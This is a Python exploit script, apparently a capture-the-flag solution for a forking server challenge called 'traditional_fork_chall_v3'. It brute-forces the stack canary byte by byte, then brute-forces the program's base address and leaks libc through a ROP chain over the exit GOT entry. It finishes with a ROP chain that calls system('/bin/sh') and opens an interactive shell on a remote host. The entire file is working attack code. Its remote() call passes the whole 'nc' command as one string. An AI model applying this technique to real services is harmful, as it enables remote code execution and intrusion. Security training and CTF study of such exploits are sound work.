#!/usr/bin/env python3
import time
from ptrlib import *

io = remote("nc 34.84.255.147 34652")
elf = ELF('../dist/traditional_fork_chall_v3')
libc = ELF('./libc.so.6')

canary = b""
for i in range(0, 8):
    for guess in range(0x100):
        if (guess == 0xa):
            continue
        test_value = canary + bytes([guess])
        payload = b'A' * 0x108 + test_value

        io.sendline(payload)
        try:
            response = io.recvuntil(b"stack", timeout=1)
            if b"stack" in response:
                continue
        except TimeoutError:
            canary += bytes([guess])
            print(f"[+] Found byte {i}: {guess:02x}")
            break
    else:
        print(f"[-] Failed to find byte {i}")
        exit(0)

print(f"[+] Full canary: {canary.hex()}")

payload = b"A" * 0x108 + canary + p64(0x0)

io.sendline(payload)
try:
    response = io.recvuntil(b"stack smashing", timeout=1)
    if b"stack smashing" in response:
        print("canary failed")
        exit(0)
except TimeoutError:
    print("canary work")

main_addr = b"\x13"
for guess in range(0x10):
    chk = (guess << 4) + 3
    test_payload = payload + main_addr + bytes([chk])
    io.sendline(test_payload)
    try:
        response = io.recvuntil(b"fork", timeout=1)
        if b"fork" in response:
            print(f"[+] Found byte: {chk:02x}")
            main_addr += bytes([chk])
            break
            
    except TimeoutError:
        response = b""
        continue
    else:
        print(f"[-] Failed to find main base")
        exit(0)

for i in range(3):
    for guess in range(0x100):
        if (guess == 0xa):
            continue
        test_payload = payload + main_addr + bytes([guess])
        io.sendline(test_payload)
        try:
            response = io.recvuntil(b"fork", timeout=0.3)
            if b"fork" in response:
                print(f"[+] Found byte: {guess:02x}")
                main_addr += bytes([guess])
                break
                
        except TimeoutError:
            response = b""
            continue
        else:
            print(f"[-] Failed to find main base")
            exit(0)
            
for guess in range(0x10):
    chk = 0x50 + guess
    test_payload = payload + main_addr + bytes([chk])
    io.sendline(test_payload)
    try:
        response = io.recvuntil(b"fork", timeout=1)
        if b"fork" in response:
            print(f"[+] Found byte: {chk:02x}")
            main_addr += bytes([chk])
            break
            
    except TimeoutError:
        response = b""
        continue
    else:
        print(f"[-] Failed to find main base")
        exit(0)

elf.base = u64(main_addr) - 0x1313
print(f"[+] main base: {hex(elf.base)}")

io.sendline(payload + p64(elf.base+0x1313))
try:
    response = io.recvuntil(b"fork failed", timeout=1)
    if b"fork failed" not in response:
        print("main base leak failed")
        exit(0)
except TimeoutError:
    print("main base work")

payload1 = payload
payload1 += p64(next(elf.gadget("pop rbp; ret;")))
payload1 += p64(elf.section(".bss")+0xf00)
payload1 += p64(elf.base + 0x12bf) #lea    rax,[rbp-0x110]
io.sendline(payload1)
payload2 = b"B"*0xd0
payload2 += p64(elf.got("exit"))
payload2 += p64(0)
payload2 += p64(0)
payload2 += canary
payload2 += p64(0)
payload2 += p64(elf.base + 0x131a) #mov    rdi,rax
payload2 += p64(0)
payload2 += canary
payload2 += p64(elf.section(".bss")+0xee0)
payload2 += p64(elf.base + 0x1287) #mov    rax,QWORD PTR [rbp-0x20]
io.debug = True
io.sendline(payload2)
libc.base = u64(io.recvuntil("\xf0")[-1:] + io.recv(5))-libc.symbol("exit")
print(f"[+] libc base: {hex(libc.base)}")


payload3 = payload
payload3 += p64(next(libc.gadget("pop rdi; ret;")))
payload3 += p64(next(libc.search("/bin/sh\x00")))
payload3 += p64(next(libc.gadget("ret;")))
payload3 += p64(libc.symbol("system"))

io.sendline(payload3)

io.interactive()
